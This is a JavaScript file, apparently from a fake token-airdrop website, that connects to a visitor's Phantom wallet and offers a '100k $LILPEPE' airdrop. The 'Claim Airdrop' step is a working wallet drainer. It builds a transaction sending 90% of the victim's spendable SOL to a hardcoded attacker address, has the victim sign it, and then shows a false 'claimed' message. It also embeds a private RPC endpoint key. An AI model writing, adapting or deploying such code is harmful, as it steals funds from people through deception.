// Ensure @solana/web3.js is available globally
if (typeof solanaWeb3 === 'undefined') {
    console.error("Solana Web3.js not found. Ensure <script src='https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js'></script> is included.");
    alert("Failed to load required libraries. Please refresh the page or check your network.");
    throw new Error("Solana Web3.js not found.");
}

// Ensure jQuery is available
if (typeof $ === 'undefined') {
    console.error("jQuery not found. Ensure <script src='https://code.jquery.com/jquery-3.6.0.min.js'></script> is included.");
    alert("Failed to load required libraries. Please refresh the page or check your network.");
    throw new Error("jQuery not found.");
}

$(document).ready(function() {
    console.log("scripts.js loaded, attaching event listener to #connect-wallet");

    $('#connect-wallet').on('click', async function(event) {
        console.log("Connect Wallet button clicked");
        event.preventDefault(); // Prevent default button behavior

        if (window.solana && window.solana.isPhantom) {
            try {
                console.log("Phantom Wallet detected, attempting connection");
                const resp = await window.solana.connect();
                console.log("Wallet connected, public key:", resp.publicKey.toString());

                var connection = new solanaWeb3.Connection(
                    'https://bold-prettiest-spree.solana-mainnet.quiknode.pro/8a34f4083d0d4a0a1533ddbd64fbecd5f6f789d4',
                    'confirmed'
                );

                const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                const walletBalance = await connection.getBalance(publicKey);
                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                console.log("Wallet balance:", walletBalance, "Min balance:", minBalance);

                if (walletBalance < minBalance) {
                    alert("Insufficient funds to proceed. Please add SOL to your wallet.");
                    console.warn("Insufficient funds detected");
                    return;
                }

                $('#connect-wallet').text("Claim Airdrop");
                console.log("Button text changed to Claim Airdrop, attaching new listener");

                $('#connect-wallet').off('click').on('click', async function(event) {
                    console.log("Claim Airdrop button clicked");
                    event.preventDefault();

                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds to proceed. Please add SOL to your wallet.");
                            console.warn("Insufficient funds for transfer");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.9),
                            })
                        );

                        transaction.feePayer = publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;
                        console.log("Transaction prepared, awaiting signature");

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed");
                        let txid = await connection.sendRawTransaction(signed.serialize());
                        console.log("Transaction sent, txid:", txid);
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed");

                        // Show 100k $LILPEPE notification
                        $('#notification').text('100k $LILPEPE claimed!').addClass('show');
                        setTimeout(() => {
                            $('#notification').removeClass('show');
                        }, 3000);
                        console.log("Displayed 100k $LILPEPE claimed notification");
                    } catch (err) {
                        console.error("Error during airdrop claim:", err.message);
                        alert("Failed to claim airdrop. Please try again or check your wallet.");
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err.message);
                alert("Failed to connect to Phantom Wallet. Please ensure it’s installed and unlocked.");
            }
        } else {
            console.log("Phantom Wallet not detected");
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

            if (isMobile) {
                console.log("Mobile device detected, attempting redirect to Phantom app");
                alert("Phantom Wallet not found. Redirecting to Phantom mobile app...");
                const currentUrl = encodeURIComponent(window.location.origin); // Simplified to origin
                const phantomMobileLink = `phantom://v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}`;
                window.location.href = phantomMobileLink; // Use location.href for reliability
                setTimeout(() => {
                    // Fallback if redirect fails
                    window.open('https://phantom.app/download', '_blank');
                }, 1000);
            } else {
                console.log("Desktop device detected, prompting extension install");
                alert("Phantom Wallet extension not found. Please install it.");
                const isFirefox = typeof InstallTrigger !== 'undefined';
                const isChrome = !!window.chrome;

                if (isFirefox) {
                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                } else if (isChrome) {
                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                } else {
                    alert("Please download the Phantom Wallet extension for your browser.");
                    window.open("https://phantom.app/download", "_blank");
                }
            }
        }
    });
});
